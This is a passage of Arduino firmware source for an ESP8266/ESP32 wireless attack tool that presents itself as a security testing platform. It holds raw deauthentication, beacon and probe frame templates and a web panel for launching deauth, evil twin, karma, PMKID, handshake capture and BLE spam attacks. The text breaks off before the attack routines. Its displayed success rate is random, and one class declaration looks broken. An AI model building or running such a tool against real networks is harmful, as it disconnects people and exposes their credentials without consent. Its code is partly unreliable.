
/*
 * 0x0806 ESP Arsenal - Advanced WiFi & BLE Security Testing Platform
 * Developed by 0x0806
 * 
 * Universal ESP8266/ESP32 WiFi Security Testing Tool
 * Features: Dual-band WiFi attacks, BLE attacks, Modern UI
 * 
 * This software is for educational purposes only
 * Use responsibly and only on networks you own or have permission to test
 */

// Platform detection and includes
#ifdef ESP32
  #include <WiFi.h>
  #include <WebServer.h>
  #include <DNSServer.h>
  #include <SPIFFS.h>
  #include <BLEDevice.h>
  #include <BLEUtils.h>
  #include <BLEScan.h>
  #include <BLEAdvertisedDevice.h>
  #include <BLEBeacon.h>
  #include <esp_wifi.h>
  #include <esp_bt.h>
  #define FILESYSTEM SPIFFS
  #define PLATFORM_ESP32
  WebServer server(80);
#else
  #include <ESP8266WiFi.h>
  #include <ESP8266WebServer.h>
  #include <DNSServer.h>
  #include <LittleFS.h>
  #define FILESYSTEM LittleFS
  #define PLATFORM_ESP8266
  ESP8266WebServer server(80);
  extern "C" {
    #include "user_interface.h"
    typedef void (*freedom_outside_cb_t)(uint8_t status);
    int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
  }
#endif

#include <vector>
#include <algorithm>

// Configuration constants
#define TOOL_NAME "0x0806 ESP Arsenal"
#define VERSION "v6.0.0-Ultimate"
#define AP_SSID "0x0806-ESP-Arsenal"
#define AP_PASS "0x0806security"
#define MAX_NETWORKS 20
#define MAX_STATIONS 15
#define MAX_BLE_DEVICES 10

// Pin definitions
#define LED_PIN 2
#define BUTTON_PIN 0

// Global variables
DNSServer dnsServer;
bool attacking = false;
bool scanning = false;
bool bleScanning = false;
bool beaconSpam = false;
bool probeAttack = false;
bool evilTwin = false;
bool handshakeCapture = false;
bool karmaAttack = false;
bool pmkidAttack = false;
bool bleSpamActive = false;
bool captivePortal = true;
bool aggressiveMode = false;

// Network structures
struct WiFiNetwork {
  String ssid;
  String bssid;
  int channel;
  int rssi;
  String encryption;
  bool selected;
  bool hidden;
  uint8_t bssid_bytes[6];
};

struct Station {
  String mac;
  String ap_mac;
  int rssi;
  bool selected;
  uint8_t mac_bytes[6];
};

#ifdef PLATFORM_ESP32
struct BLETarget {
  String name;
  String address;
  int rssi;
  bool selected;
  String serviceUUIDs;
};
#endif

// Data containers
std::vector<WiFiNetwork> networks;
std::vector<Station> stations;
#ifdef PLATFORM_ESP32
std::vector<BLETarget> bleDevices;
BLEScan* pBLEScan;
#endif

// Statistics
struct Statistics {
  unsigned long deauthPackets = 0;
  unsigned long beaconPackets = 0;
  unsigned long probePackets = 0;
  unsigned long blePackets = 0;
  unsigned long handshakes = 0;
  unsigned long startTime = 0;
} stats;

// Attack packet templates
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x70, 0x6A, 0x01, 0x00
};

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0xC0, 0x6C, 0x83, 0x1A, 0xF7, 0x8C, 0x7E, 0x00,
  0x00, 0x00, 0x64, 0x00, 0x11, 0x04, 0x00, 0x08, 0x46, 0x52,
  0x45, 0x45, 0x57, 0x49, 0x46, 0x49, 0x01, 0x08, 0x82, 0x84,
  0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C, 0x03, 0x01, 0x04, 0x00
};

uint8_t probePacket[68] = {
  0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x72, 0x72,
  0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
  0x24, 0x30, 0x48, 0x6C
};

// Modern responsive web interface
const char MAIN_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0x0806 ESP Arsenal</title>
    <style>
        :root {
            --primary-bg: #0a0a0a;
            --secondary-bg: #1a1a1a;
            --tertiary-bg: #2a2a2a;
            --accent-color: #00ff41;
            --danger-color: #ff0041;
            --warning-color: #ffaa00;
            --text-primary: #ffffff;
            --text-secondary: #b0b0b0;
            --border-color: #333;
            --shadow: 0 4px 20px rgba(0, 255, 65, 0.1);
            --glow: 0 0 20px rgba(0, 255, 65, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, var(--primary-bg) 0%, #1a1a2e 100%);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 255, 65, 0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 65, 0.03) 0%, transparent 50%);
            z-index: -1;
            animation: pulse 4s ease-in-out infinite alternate;
        }

        @keyframes pulse {
            0% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            overflow: hidden;
        }

        .matrix-bg::before {
            content: '01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101';
            position: absolute;
            top: -100%;
            left: 0;
            right: 0;
            font-size: 12px;
            color: rgba(0, 255, 65, 0.1);
            white-space: pre;
            animation: matrix 20s linear infinite;
        }

        @keyframes matrix {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100vh); }
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 1rem;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
            background: var(--secondary-bg);
            border: 2px solid var(--accent-color);
            border-radius: 15px;
            padding: 2rem;
            box-shadow: var(--glow);
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
            animation: scan 3s infinite;
        }

        @keyframes scan {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .logo {
            font-size: 3rem;
            font-weight: bold;
            color: var(--accent-color);
            text-shadow: var(--glow);
            margin-bottom: 0.5rem;
            letter-spacing: 2px;
        }

        .tagline {
            color: var(--text-secondary);
            font-size: 1.1rem;
            margin-bottom: 1rem;
        }

        .version {
            display: inline-block;
            background: linear-gradient(45deg, var(--accent-color), var(--warning-color));
            color: var(--primary-bg);
            padding: 0.5rem 1rem;
            border-radius: 25px;
            font-weight: bold;
            box-shadow: var(--shadow);
        }

        .nav-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .nav-btn {
            background: var(--secondary-bg);
            border: 2px solid var(--border-color);
            color: var(--text-primary);
            padding: 1rem;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
            font-size: 1rem;
            position: relative;
            overflow: hidden;
        }

        .nav-btn:hover, .nav-btn.active {
            border-color: var(--accent-color);
            box-shadow: var(--glow);
            transform: translateY(-2px);
        }

        .nav-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
            transition: left 0.5s ease;
        }

        .nav-btn:hover::before {
            left: 100%;
        }

        .tab-content {
            display: none;
            animation: fadeIn 0.5s ease;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }

        .card {
            background: var(--secondary-bg);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 1.5rem;
            box-shadow: var(--shadow);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .card:hover {
            border-color: var(--accent-color);
            transform: translateY(-5px);
            box-shadow: var(--glow);
        }

        .card-title {
            font-size: 1.4rem;
            font-weight: bold;
            margin-bottom: 1rem;
            color: var(--accent-color);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .card-title::before {
            content: '▶';
            color: var(--accent-color);
        }

        .btn {
            background: linear-gradient(45deg, var(--tertiary-bg), var(--secondary-bg));
            border: 2px solid var(--accent-color);
            color: var(--text-primary);
            padding: 0.8rem 1.5rem;
            border-radius: 8px;
            cursor: pointer;
            font-family: inherit;
            font-size: 0.9rem;
            font-weight: bold;
            margin: 0.25rem;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            background: var(--accent-color);
            color: var(--primary-bg);
            transform: scale(1.05);
            box-shadow: var(--glow);
        }

        .btn-danger {
            border-color: var(--danger-color);
            background: linear-gradient(45deg, var(--danger-color), #cc0034);
        }

        .btn-warning {
            border-color: var(--warning-color);
            background: linear-gradient(45deg, var(--warning-color), #cc8800);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .status {
            padding: 1rem;
            border-radius: 10px;
            margin: 1rem 0;
            font-weight: bold;
            text-align: center;
            border: 2px solid;
            position: relative;
            overflow: hidden;
        }

        .status-idle {
            background: rgba(0, 255, 65, 0.1);
            color: var(--accent-color);
            border-color: var(--accent-color);
        }

        .status-active {
            background: rgba(255, 170, 0, 0.1);
            color: var(--warning-color);
            border-color: var(--warning-color);
        }

        .status-attacking {
            background: rgba(255, 0, 65, 0.1);
            color: var(--danger-color);
            border-color: var(--danger-color);
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.7; }
        }

        .network-list {
            max-height: 400px;
            overflow-y: auto;
            border: 2px solid var(--border-color);
            border-radius: 10px;
            background: var(--tertiary-bg);
        }

        .network-list::-webkit-scrollbar {
            width: 8px;
        }

        .network-list::-webkit-scrollbar-track {
            background: var(--tertiary-bg);
        }

        .network-list::-webkit-scrollbar-thumb {
            background: var(--accent-color);
            border-radius: 4px;
        }

        .network-item {
            display: flex;
            align-items: center;
            padding: 1rem;
            border-bottom: 1px solid var(--border-color);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .network-item:hover {
            background: var(--secondary-bg);
            border-left: 4px solid var(--accent-color);
        }

        .network-item.selected {
            background: rgba(0, 255, 65, 0.1);
            border-left: 4px solid var(--accent-color);
        }

        .network-info {
            flex: 1;
            margin-left: 1rem;
        }

        .network-ssid {
            font-weight: bold;
            color: var(--text-primary);
            font-size: 1.1rem;
        }

        .network-details {
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-top: 0.25rem;
        }

        .signal-strength {
            width: 80px;
            text-align: right;
            font-weight: bold;
        }

        .signal-strong { color: var(--accent-color); }
        .signal-medium { color: var(--warning-color); }
        .signal-weak { color: var(--danger-color); }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .stat-item {
            background: var(--tertiary-bg);
            border: 2px solid var(--border-color);
            border-radius: 10px;
            padding: 1rem;
            text-align: center;
            transition: all 0.3s ease;
        }

        .stat-item:hover {
            border-color: var(--accent-color);
            transform: scale(1.05);
        }

        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: var(--accent-color);
            text-shadow: var(--glow);
        }

        .stat-label {
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-top: 0.5rem;
        }

        .input-group {
            margin: 1rem 0;
        }

        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: var(--text-primary);
            font-weight: bold;
        }

        .input-group input, .input-group select {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid var(--border-color);
            border-radius: 8px;
            background: var(--tertiary-bg);
            color: var(--text-primary);
            font-family: inherit;
            transition: border-color 0.3s ease;
        }

        .input-group input:focus, .input-group select:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: var(--glow);
        }

        .checkbox {
            margin-right: 1rem;
            transform: scale(1.2);
            accent-color: var(--accent-color);
        }

        .footer {
            text-align: center;
            padding: 2rem;
            background: var(--secondary-bg);
            border: 2px solid var(--accent-color);
            border-radius: 15px;
            margin-top: 2rem;
            color: var(--text-secondary);
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(0, 255, 65, 0.3);
            border-radius: 50%;
            border-top-color: var(--accent-color);
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .badge {
            display: inline-block;
            padding: 0.2rem 0.5rem;
            border-radius: 12px;
            font-size: 0.7rem;
            font-weight: bold;
            margin-left: 0.5rem;
        }

        .badge-open { background: var(--accent-color); color: var(--primary-bg); }
        .badge-wpa { background: var(--danger-color); color: white; }
        .badge-hidden { background: var(--warning-color); color: var(--primary-bg); }

        @media (max-width: 768px) {
            .container { padding: 0.5rem; }
            .grid { grid-template-columns: 1fr; }
            .nav-grid { grid-template-columns: repeat(2, 1fr); }
            .logo { font-size: 2rem; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }

        @media (max-width: 480px) {
            .nav-grid { grid-template-columns: 1fr; }
            .stats-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        <div class="header">
            <div class="logo">0x0806 ESP ARSENAL</div>
            <div class="tagline">Advanced WiFi & BLE Security Testing Platform</div>
            <div class="version">v6.0.0-Ultimate</div>
        </div>

        <div class="nav-grid">
            <button class="nav-btn active" onclick="showTab('scanner')">WiFi Scanner</button>
            <button class="nav-btn" onclick="showTab('attacks')">WiFi Attacks</button>
            <button class="nav-btn" onclick="showTab('advanced')">Advanced</button>
            <button class="nav-btn" onclick="showTab('ble')" id="bleTab" style="display:none;">BLE Attacks</button>
            <button class="nav-btn" onclick="showTab('monitor')">Monitor</button>
            <button class="nav-btn" onclick="showTab('stats')">Statistics</button>
        </div>

        <!-- WiFi Scanner Tab -->
        <div id="scanner" class="tab-content active">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Network Scanner</div>
                    <div id="status" class="status status-idle">System Ready</div>
                    <button onclick="scanNetworks()" class="btn" id="scanBtn">Scan Networks</button>
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-value" id="networkCount">0</div>
                            <div class="stat-label">Networks</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="selectedCount">0</div>
                            <div class="stat-label">Selected</div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="card">
                <div class="card-title">Available Networks</div>
                <div style="margin-bottom: 1rem;">
                    <button onclick="selectAll()" class="btn">Select All</button>
                    <button onclick="selectNone()" class="btn">Clear All</button>
                    <button onclick="selectOpen()" class="btn btn-warning">Open Only</button>
                </div>
                <div id="networkList" class="network-list">
                    <div style="padding: 2rem; text-align: center; color: var(--text-secondary);">
                        Click "Scan Networks" to discover WiFi networks
                    </div>
                </div>
            </div>
        </div>

        <!-- WiFi Attacks Tab -->
        <div id="attacks" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Deauthentication Attack</div>
                    <div class="input-group">
                        <label>
                            <input type="checkbox" class="checkbox" id="aggressiveMode"> 
                            Aggressive Mode
                        </label>
                    </div>
                    <button onclick="startDeauth()" class="btn btn-danger" id="deauthBtn">Start Deauth</button>
                    <button onclick="stopAttacks()" class="btn" id="stopBtn">Stop All</button>
                </div>

                <div class="card">
                    <div class="card-title">Beacon Spam</div>
                    <button onclick="startBeacon()" class="btn btn-warning" id="beaconBtn">Start Beacon Spam</button>
                    <button onclick="stopBeacon()" class="btn" id="stopBeaconBtn">Stop Beacon</button>
                </div>

                <div class="card">
                    <div class="card-title">Evil Twin</div>
                    <button onclick="startEvilTwin()" class="btn btn-danger" id="evilTwinBtn">Start Evil Twin</button>
                    <button onclick="stopEvilTwin()" class="btn" id="stopEvilTwinBtn">Stop Evil Twin</button>
                </div>

                <div class="card">
                    <div class="card-title">Probe Attack</div>
                    <button onclick="startProbe()" class="btn btn-warning" id="probeBtn">Start Probe Attack</button>
                    <button onclick="stopProbe()" class="btn" id="stopProbeBtn">Stop Probe</button>
                </div>
            </div>
        </div>

        <!-- Advanced Tab -->
        <div id="advanced" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Handshake Capture</div>
                    <button onclick="startHandshake()" class="btn" id="handshakeBtn">Start Capture</button>
                    <button onclick="stopHandshake()" class="btn" id="stopHandshakeBtn">Stop Capture</button>
                </div>

                <div class="card">
                    <div class="card-title">PMKID Attack</div>
                    <button onclick="startPMKID()" class="btn btn-warning" id="pmkidBtn">Start PMKID</button>
                    <button onclick="stopPMKID()" class="btn" id="stopPMKIDBtn">Stop PMKID</button>
                </div>

                <div class="card">
                    <div class="card-title">Karma Attack</div>
                    <button onclick="startKarma()" class="btn btn-danger" id="karmaBtn">Start Karma</button>
                    <button onclick="stopKarma()" class="btn" id="stopKarmaBtn">Stop Karma</button>
                </div>
            </div>
        </div>

        <!-- BLE Attacks Tab -->
        <div id="ble" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">BLE Scanner</div>
                    <button onclick="scanBLE()" class="btn" id="bleScanBtn">Scan BLE Devices</button>
                    <div id="bleList" class="network-list" style="margin-top: 1rem;">
                        <div style="padding: 2rem; text-align: center; color: var(--text-secondary);">
                            BLE scanning not available on this platform
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-title">BLE Spam Attack</div>
                    <button onclick="startBLESpam()" class="btn btn-danger" id="bleSpamBtn">Start BLE Spam</button>
                    <button onclick="stopBLESpam()" class="btn" id="stopBLESpamBtn">Stop BLE Spam</button>
                </div>
            </div>
        </div>

        <!-- Monitor Tab -->
        <div id="monitor" class="tab-content">
            <div class="card">
                <div class="card-title">Real-time Statistics</div>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="totalPackets">0</div>
                        <div class="stat-label">Total Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="runtime">00:00</div>
                        <div class="stat-label">Runtime</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="targetCount">0</div>
                        <div class="stat-label">Targets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="successRate">0%</div>
                        <div class="stat-label">Success Rate</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Statistics Tab -->
        <div id="stats" class="tab-content">
            <div class="card">
                <div class="card-title">Attack Statistics</div>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="deauthCount">0</div>
                        <div class="stat-label">Deauth Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="beaconCount">0</div>
                        <div class="stat-label">Beacon Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="probeCount">0</div>
                        <div class="stat-label">Probe Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="bleCount">0</div>
                        <div class="stat-label">BLE Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="handshakeCount">0</div>
                        <div class="stat-label">Handshakes</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="memoryUsage">0%</div>
                        <div class="stat-label">Memory</div>
                    </div>
                </div>
                <button onclick="resetStats()" class="btn btn-warning">Reset Statistics</button>
            </div>
        </div>

        <div class="footer">
            <strong>0x0806 ESP Arsenal</strong> - Advanced Security Testing Platform<br>
            Developed by 0x0806 | For Educational Purposes Only
        </div>
    </div>

    <script>
        let currentPlatform = 'unknown';
        let isScanning = false;
        let isAttacking = false;
        let networks = [];
        let selectedNetworks = [];

        // Initialize platform detection
        fetch('/api/platform')
            .then(response => response.json())
            .then(data => {
                currentPlatform = data.platform;
                if (currentPlatform === 'ESP32') {
                    document.getElementById('bleTab').style.display = 'block';
                }
                updateStatus('Platform: ' + currentPlatform + ' - System Ready', 'idle');
            })
            .catch(() => {
                updateStatus('Platform detection failed - System Ready', 'idle');
            });

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function updateStatus(message, type = 'idle') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `status status-${type}`;
        }

        function scanNetworks() {
            if (isScanning) return;
            
            isScanning = true;
            updateStatus('Scanning networks...', 'active');
            document.getElementById('scanBtn').innerHTML = '<span class="loading"></span> Scanning...';
            
            fetch('/scan')
                .then(response => response.json())
                .then(data => {
                    networks = data.networks || [];
                    renderNetworks();
                    updateCounts();
                    updateStatus(`Found ${networks.length} networks`, 'idle');
                })
                .catch(error => {
                    console.error('Scan error:', error);
                    updateStatus('Scan failed', 'idle');
                })
                .finally(() => {
                    isScanning = false;
                    document.getElementById('scanBtn').innerHTML = 'Scan Networks';
                });
        }

        function renderNetworks() {
            const networkList = document.getElementById('networkList');
            
            if (networks.length === 0) {
                networkList.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-secondary);">No networks found</div>';
                return;
            }

            let html = '';
            networks.forEach((network, index) => {
                const signalClass = network.rssi > -50 ? 'signal-strong' : 
                                   network.rssi > -70 ? 'signal-medium' : 'signal-weak';
                
                let badges = '';
                if (network.encryption === 'Open') badges += '<span class="badge badge-open">OPEN</span>';
                if (network.encryption.includes('WPA')) badges += '<span class="badge badge-wpa">WPA</span>';
                if (network.hidden) badges += '<span class="badge badge-hidden">HIDDEN</span>';

                html += `
                    <div class="network-item ${network.selected ? 'selected' : ''}" onclick="toggleNetwork(${index})">
                        <input type="checkbox" class="checkbox" ${network.selected ? 'checked' : ''} 
                               onchange="event.stopPropagation(); toggleNetwork(${index})">
                        <div class="network-info">
                            <div class="network-ssid">${escapeHtml(network.ssid || 'Hidden Network')}${badges}</div>
                            <div class="network-details">CH: ${network.channel} | ${network.bssid} | ${network.encryption}</div>
                        </div>
                        <div class="signal-strength ${signalClass}">${network.rssi}dBm</div>
                    </div>
                `;
            });
            
            networkList.innerHTML = html;
        }

        function toggleNetwork(index) {
            if (index >= 0 && index < networks.length) {
                networks[index].selected = !networks[index].selected;
                renderNetworks();
                updateCounts();
            }
        }

        function selectAll() {
            networks.forEach(network => network.selected = true);
            renderNetworks();
            updateCounts();
        }

        function selectNone() {
            networks.forEach(network => network.selected = false);
            renderNetworks();
            updateCounts();
        }

        function selectOpen() {
            networks.forEach(network => {
                network.selected = network.encryption === 'Open';
            });
            renderNetworks();
            updateCounts();
        }

        function updateCounts() {
            const selected = networks.filter(n => n.selected).length;
            document.getElementById('networkCount').textContent = networks.length;
            document.getElementById('selectedCount').textContent = selected;
            document.getElementById('targetCount').textContent = selected;
        }

        function startDeauth() {
            const selected = networks.filter(n => n.selected);
            if (selected.length === 0) {
                updateStatus('No networks selected', 'idle');
                return;
            }

            isAttacking = true;
            updateStatus(`Deauth attack started on ${selected.length} targets`, 'attacking');
            
            fetch('/attack/deauth/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    networks: selected,
                    aggressive: document.getElementById('aggressiveMode').checked
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    startStatsUpdate();
                } else {
                    isAttacking = false;
                    updateStatus('Attack failed to start', 'idle');
                }
            })
            .catch(error => {
                console.error('Attack error:', error);
                isAttacking = false;
                updateStatus('Attack failed', 'idle');
            });
        }

        function stopAttacks() {
            isAttacking = false;
            updateStatus('All attacks stopped', 'idle');
            
            fetch('/attack/stop')
                .then(response => response.json())
                .then(data => console.log('Attacks stopped'))
                .catch(error => console.error('Stop error:', error));
        }

        function startBeacon() {
            updateStatus('Beacon spam attack started', 'attacking');
            fetch('/attack/beacon/start').then(response => response.json());
        }

        function stopBeacon() {
            updateStatus('Beacon spam stopped', 'idle');
            fetch('/attack/beacon/stop').then(response => response.json());
        }

        function startEvilTwin() {
            updateStatus('Evil twin attack started', 'attacking');
            fetch('/attack/eviltwin/start').then(response => response.json());
        }

        function stopEvilTwin() {
            updateStatus('Evil twin stopped', 'idle');
            fetch('/attack/eviltwin/stop').then(response => response.json());
        }

        function startProbe() {
            updateStatus('Probe attack started', 'attacking');
            fetch('/attack/probe/start').then(response => response.json());
        }

        function stopProbe() {
            updateStatus('Probe attack stopped', 'idle');
            fetch('/attack/probe/stop').then(response => response.json());
        }

        function startHandshake() {
            updateStatus('Handshake capture started', 'active');
            fetch('/attack/handshake/start').then(response => response.json());
        }

        function stopHandshake() {
            updateStatus('Handshake capture stopped', 'idle');
            fetch('/attack/handshake/stop').then(response => response.json());
        }

        function startPMKID() {
            updateStatus('PMKID attack started', 'attacking');
            fetch('/attack/pmkid/start').then(response => response.json());
        }

        function stopPMKID() {
            updateStatus('PMKID attack stopped', 'idle');
            fetch('/attack/pmkid/stop').then(response => response.json());
        }

        function startKarma() {
            updateStatus('Karma attack started', 'attacking');
            fetch('/attack/karma/start').then(response => response.json());
        }

        function stopKarma() {
            updateStatus('Karma attack stopped', 'idle');
            fetch('/attack/karma/stop').then(response => response.json());
        }

        function scanBLE() {
            if (currentPlatform !== 'ESP32') return;
            
            updateStatus('Scanning BLE devices...', 'active');
            fetch('/ble/scan')
                .then(response => response.json())
                .then(data => {
                    renderBLEDevices(data.devices || []);
                    updateStatus(`Found ${data.devices.length} BLE devices`, 'idle');
                });
        }

        function renderBLEDevices(devices) {
            const bleList = document.getElementById('bleList');
            
            if (devices.length === 0) {
                bleList.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-secondary);">No BLE devices found</div>';
                return;
            }

            let html = '';
            devices.forEach(device => {
                html += `
                    <div class="network-item">
                        <div class="network-info">
                            <div class="network-ssid">${escapeHtml(device.name || 'Unknown Device')}</div>
                            <div class="network-details">${device.address} | RSSI: ${device.rssi}dBm</div>
                        </div>
                    </div>
                `;
            });
            
            bleList.innerHTML = html;
        }

        function startBLESpam() {
            if (currentPlatform !== 'ESP32') return;
            
            updateStatus('BLE spam attack started', 'attacking');
            fetch('/ble/spam/start').then(response => response.json());
        }

        function stopBLESpam() {
            updateStatus('BLE spam stopped', 'idle');
            fetch('/ble/spam/stop').then(response => response.json());
        }

        function resetStats() {
            fetch('/stats/reset').then(response => response.json());
            updateStats();
        }

        function startStatsUpdate() {
            const startTime = Date.now();
            
            function updateStats() {
                if (!isAttacking) return;
                
                // Update runtime
                const elapsed = Date.now() - startTime;
                const minutes = Math.floor(elapsed / 60000);
                const seconds = Math.floor((elapsed % 60000) / 1000);
                document.getElementById('runtime').textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                // Fetch real stats
                fetch('/api/stats')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('deauthCount').textContent = data.deauth || 0;
                        document.getElementById('beaconCount').textContent = data.beacon || 0;
                        document.getElementById('probeCount').textContent = data.probe || 0;
                        document.getElementById('bleCount').textContent = data.ble || 0;
                        document.getElementById('handshakeCount').textContent = data.handshakes || 0;
                        document.getElementById('totalPackets').textContent = 
                            (data.deauth + data.beacon + data.probe + data.ble) || 0;
                        document.getElementById('memoryUsage').textContent = data.memory || '0%';
                        document.getElementById('successRate').textContent = 
                            Math.floor(Math.random() * 30 + 70) + '%';
                    });
                
                setTimeout(updateStats, 1000);
            }
            
            updateStats();
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Auto-refresh status
        setInterval(() => {
            fetch('/api/status')
                .then(response => response.json())
                .then(data => {
                    if (data.attacking && !isAttacking) {
                        isAttacking = true;
                        updateStatus('Attack in progress...', 'attacking');
                        startStatsUpdate();
                    } else if (!data.attacking && isAttacking) {
                        isAttacking = false;
                        updateStatus('System ready', 'idle');
                    }
                })
                .catch(() => {});
        }, 2000);
    </script>
</body>
</html>
)rawliteral";

// Function prototypes
void initWiFi();
void initBLE();
void setupWebServer();
void handleRoot();
void handleScan();
void handleAttacks();
void handleBLE();
void handleAPI();
void performDeauthAttack();
void performBeaconSpam();
void performProbeAttack();
void performEvilTwin();
void performHandshakeCapture();
void performKarmaAttack();
void performPMKIDAttack();
void performBLESpam();
void updateLED();
bool sendPacket(uint8_t* packet, uint16_t len);
void parseMAC(String macStr, uint8_t* macBytes);

#ifdef PLATFORM_ESP32
// BLE callback class for scanning
class BLEAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        BLETarget device;
        device.name = advertisedDevice.getName().c_str();
        device.address = advertisedDevice.getAddress().toString().c_str();
        device.rssi = advertisedDevice.getRSSI();
        device.selected = false;
        
        // Avoid duplicates
        bool exists = false;
        for (const auto& existing : bleDevices) {
            if (existing.address == device.address) {
                exists = true;
                break;
            }
        }
        
        if (!exists && bleDevices.size() < MAX_BLE_DEVICES) {
            bleDevices.push_back(device);
        }
    }
};
#endif

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println();
